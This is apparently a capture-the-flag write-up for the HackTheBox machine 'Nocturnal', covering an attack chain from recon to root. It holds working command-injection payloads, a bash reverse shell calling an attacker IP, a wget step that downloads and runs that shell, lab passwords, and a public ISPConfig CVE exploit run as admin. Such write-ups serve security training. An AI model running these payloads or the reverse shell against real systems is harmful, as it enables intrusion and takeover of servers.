![](Pasted%20image%2020250518191255.png)

# Recon

## Nmap

```
nmap -sCV -oN nmap/initial nocturnal.htb
```

```bash
Nmap scan report for nocturnal.htb (10.10.11.64)
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to Nocturnal
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

# Web App Hacking

![](Pasted%20image%2020250518191501.png)
opening the website, sounds like we can upload doc files. let's register and login.

once you login you will be faced with a file upload functionality, I uploaded a random file:
![](Pasted%20image%2020250518191833.png)

hmm, so strange that it accepts the `username` parameter, let's change the file name to like `/etc/passwd`:
![](Pasted%20image%2020250518191940.png)

let's add `%0a%0d.pdf` for it:
![](Pasted%20image%2020250518192026.png)

hmm, nothing .. wait! It lists the files uploaded by the user? what if we enumerated the users? let's do it with `ffuf`:

```bash
ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=file_example_XLS_10.xls' -w users.txt -H 'Cookie: PHPSESSID=nofnbrnj6ju8d7fr0fn3fpposs' -fs 2985 
```

First I ran it without `-fs 2985`, but it shows alot of false positives with length of `2985` so I filtered them.

```bash
admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 72ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 70ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 69ms]
```

and this is the results, we got 3 users:
- `admin`
- `amanda`
- `tobias`

`admin` and `tobias` both has nothing uploaded but `amanda` does:
![](Pasted%20image%2020250518192604.png)

After downloading the file and searching for a odt file viewer online. this shows:

![](Pasted%20image%2020250518192647.png)

so we got a password for `amanda`, let's login with `amanda`!

![](Pasted%20image%2020250518192813.png)

interesting, let's see what's inside!
![](Pasted%20image%2020250518192846.png)

and surprisingly! we can view the source code!

viewing the `admin.php` file:
```php
<?php
session_start();

if (!isset($_SESSION['user_id']) || ($_SESSION['username'] !== 'admin' && $_SESSION['username'] !== 'amanda')) {
    header('Location: login.php');
    exit();
}

function sanitizeFilePath($filePath) {
    return basename($filePath); // Only gets the base name of the file
}

// List only PHP files in a directory
function listPhpFiles($dir) {
    $files = array_diff(scandir($dir), ['.', '..']);
    echo "<ul class='file-list'>";
    foreach ($files as $file) {
        $sanitizedFile = sanitizeFilePath($file);
        if (is_dir($dir . '/' . $sanitizedFile)) {
            // Recursively call to list files inside directories
            echo "<li class='folder'>📁 <strong>" . htmlspecialchars($sanitizedFile) . "</strong>";
            echo "<ul>";
            listPhpFiles($dir . '/' . $sanitizedFile);
            echo "</ul></li>";
        } else if (pathinfo($sanitizedFile, PATHINFO_EXTENSION) === 'php') {
            // Show only PHP files
            echo "<li class='file'>📄 <a href='admin.php?view=" . urlencode($sanitizedFile) . "'>" . htmlspecialchars($sanitizedFile) . "</a></li>";
        }
    }
    echo "</ul>";
}

// View the content of the PHP file if the 'view' option is passed
if (isset($_GET['view'])) {
    $file = sanitizeFilePath($_GET['view']);
    $filePath = __DIR__ . '/' . $file;
    if (file_exists($filePath) && pathinfo($filePath, PATHINFO_EXTENSION) === 'php') {
        $content = htmlspecialchars(file_get_contents($filePath));
    } else {
        $content = "File not found or invalid path.";
    }
}

function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
?>



<?php
if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
        
        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];

        $process = proc_open($command, $descriptor_spec, $pipes);
        if (is_resource($process)) {
            proc_close($process);
        }

        sleep(2);

        $logContents = file_get_contents($logFile);
        if (strpos($logContents, 'zip error') === false) {
            echo "<div class='backup-success'>";
            echo "<p>Backup created successfully.</p>";
            echo "<a href='" . htmlspecialchars($backupFile) . "' class='download-button' download>Download Backup</a>";
            echo "<h3>Output:</h3><pre>" . htmlspecialchars($logContents) . "</pre>";
            echo "</div>";
        } else {
            echo "<div class='error-message'>Error creating the backup.</div>";
        }

        unlink($logFile);
    }
}
?>
```

after reading the source code, one line caught my eyes:
```php
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```

hmm, so the password is being passed without any sanitization? so we can inject commands right?

after sometime of trying to craft the right payload I came up with this:
```bash
%0Abash%2520-c%2520"id"%0A
```
- `%0A` for a new line
- `%2520` is a doubled url encode for a space (trying tab `%09` also worked).

![](Pasted%20image%2020250518194008.png)

## Reverse Shell

now we have to make a simple shell script and upload it to the vulnerable server.

1. create the shell script (revshell from https://www.revshells.com/):
```bash
#!/bin/bash
sh -i >& /dev/tcp/10.10.16.39/4444 0>&1
```

2. start a server on our host:
```shell
python3 -m http.server
```

3. upload the script to the server with this payload:
```shell
%0Abash%2520-c%2520"wget%0910.10.16.39:8000/shell"%0A
```

4. finally start a listener to catch the reverse shell and run the script on the server:
```bash
%0Abash%2520-c%2520"bash%09shell"%0A
```

and to listen for the reverse shell I am using [penelope](https://github.com/brightio/penelope).

and we got a shell:
![](Pasted%20image%2020250518203801.png)
## Privilege Escalation

![](Pasted%20image%2020250518203918.png)
an SQLite file, let's open it with `sqlite3`:
![](Pasted%20image%2020250518204111.png)

Great, we have hashes for `admin` and `tobias` password's, let's head to https://crackstation.net and search for `tobias` password.

![](Pasted%20image%2020250518204302.png)
awesome! let's ssh with this user (or switch user `su` to `tobias`):
![](Pasted%20image%2020250518204428.png)

now, time to another privilege escalation!

after some diging in the system, I ran `ss -tunlp` and I found an interesting running port!
![](Pasted%20image%2020250518204623.png)

now all we have to do is to do a port forwarding with `ssh`:
```bash
ssh -L 1337:127.0.0.1:8080 tobias@10.10.11.64 -N
```

here we tell ssh to login with user `tobias` and forward the running port `8080` on the server to our localhost (`127.0.0.1`) on port `1337`. once you enter the password we found previously go ahead to `https://127.0.0.1:1337/`.
![](Pasted%20image%2020250518204926.png)

What I love to do if I am facing any login page (without registration enabled) is to try using the previous password (we found before).

Passwords:
- for `amanda` was `arHkG7HAI68X8s1J`
- for `tobias` was `slowmotionapocalypse`

now we have to know the user. let's search for the default credentials for ISPConfig:
![](Pasted%20image%2020250518205236.png)

let's try `admin:arHkG7HAI68X8s1J`:
![](Pasted%20image%2020250518205307.png)

`admin:slowmotionapocalypse`:
![](Pasted%20image%2020250518205342.png)

Awesome! now we want to search for any CVEs (exploits) for this ISPConfig thing. but first let's search for the version.

after some digging I found it in the Help Page:
![](Pasted%20image%2020250518205451.png)

searching for exploits to this version I found this:
https://github.com/bipbopbup/CVE-2023-46818-python-exploit

```bash
git clone https://github.com/bipbopbup/CVE-2023-46818-python-exploit.git

cd CVE-2023-46818-python-exploit/
python3 exploit.py http://127.0.0.1:1337/ admin slowmotionapocalypse
```

![](Pasted%20image%2020250518205717.png)
ezzzy